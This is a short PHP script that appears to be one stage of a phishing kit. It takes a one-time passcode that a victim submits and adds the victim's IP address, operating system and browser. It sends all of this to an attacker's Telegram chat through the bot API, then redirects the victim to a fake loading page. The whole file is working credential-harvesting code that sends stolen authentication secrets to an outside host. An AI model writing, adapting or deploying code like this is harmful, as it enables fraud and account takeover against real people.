<?php
include'./tginfo.php';
include'./agent.php';
$ip = getenv("REMOTE_ADDR");
$otp = $_POST['msg'];

if (!empty($otp)) {
      $coronamsg .= "esdeath\n";
      $coronamsg .= "\n💸 $otp  (2/2)\n\n🌍 $ip $user_os $user_browser\n";
      $token = "$coronatoken";
        $data = ['text' => $coronamsg,'chat_id' => $coronachat,];
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
        header("Location: ../loading05.php");
    }
else{
      header('Location: ../index.php');
    }


?>